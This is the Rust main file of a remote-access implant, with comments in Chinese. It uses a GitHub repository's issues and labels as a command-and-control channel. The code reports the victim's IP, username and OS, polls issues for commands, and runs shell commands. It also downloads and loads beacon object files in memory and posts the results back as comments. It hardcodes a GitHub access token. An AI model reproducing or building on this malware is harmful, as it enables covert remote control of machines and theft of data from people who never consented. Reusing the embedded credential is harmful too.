mod command;
use github;
use std::collections::HashSet;

//伪随机生成8位字母数字的id
fn generate_random_string() -> String {
    let charset: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
    let mut random_string = String::with_capacity(8);

    let current_time = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("Time went backwards")
        .as_nanos() as u64;

    let (a, c, m) = (1103515245, 12345, 2_147_483_648); // LCG 参数
    let mut x = current_time % m;

    for _ in 0..8 {
        x = (a * x + c) % m; // LCG 公式
        let index = x % charset.len() as u64; // 计算索引
        random_string.push(charset[index as usize] as char);
    }

    random_string
}


fn get_metadata(id:&String)-> github::Metadata{

    let ipv4 = match command::get_private_ip(){
        Some(ip)=>ip.to_string(),
        None=>"127.0.0.1".to_string(),
    };

    let username = match command::get_username(){
        Some(username) => username,
        None=>"None".to_string(),
    };

    let os_type = std::env::consts::OS.to_string();

    let metadata = github::Metadata{
        id:id.to_string(),
        ip:ipv4,
        username:username,
        system:os_type,
    };
    return metadata;
}

fn handel_command(command:&command::Cmd) ->String{
    match command.cmd.as_str() {
        "ls" => command::ls_command(&command.args).unwrap_or_else(|e| e.to_string()),
        "shell" => command::shell_command(&command.args).unwrap_or_else(|e| e.to_string()),
        _ => format!("Unknown command: {}", command.cmd),
    }
}

//主函数手动处理错误，防止程序退出。
#[tokio::main]
async fn main(){

    //配置
    let github_config = github::GithubConfig {
        access_token: String::from("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"),
        username: String::from("killjapandog"),
        repository: String::from("demo"),
    };

    //生成implant_id
    let implant_id = generate_random_string();

    //获取metadata
    let metadata = get_metadata(&implant_id);

    //创建lable
    loop {
        if let Ok(_) = github::create_lable(&github_config, &implant_id,&metadata).await {
            break; // 退出循环
        } else {
            tokio::time::sleep(tokio::time::Duration::from_secs(5)).await; // 等待5秒后重试
        }
    }

    // 已执行命令的集合
    let mut executed_commands: HashSet<github::ExecCommand> = HashSet::new(); 

    loop{
        //获取命令
        let commands = match github::get_label_issue(&github_config,&implant_id).await{
            Ok(command) => command,
            Err(_)=>{
                return;
            }
        };

        for command in commands{
            if executed_commands.contains(&command){
                continue;
            }
            let cmd = command::string2cmd(&command.title);

            if cmd.cmd=="bof"{
                match github::download_file(&github_config, &cmd.args).await{
                    Ok(bof_file)=>{
                        match coff::load_coff(&bof_file){
                            Ok(result)=>{
                                match github::post_comment(&github_config,&result,&command.issue_num).await{
                                    Ok(())=>{
                                    }
                                    Err(_)=>{
                                        return;
                                    }
                                }
                            }
                            Err(e)=>{
                                match github::post_comment(&github_config,&e.to_string(),&command.issue_num).await{
                                    Ok(())=>{
                                    }
                                    Err(_)=>{
                                        return;
                                    }
                                }
                            }
                        }
                    }
                    Err(_)=>{}
                }
            }else{
                let result = handel_command(&cmd);
                match github::post_comment(&github_config,&result,&command.issue_num).await{
                    Ok(())=>{
                    }
                    Err(_)=>{
                        return;
                    }
                }
            }
            executed_commands.insert(command.clone());
        }     
        tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
    }
}

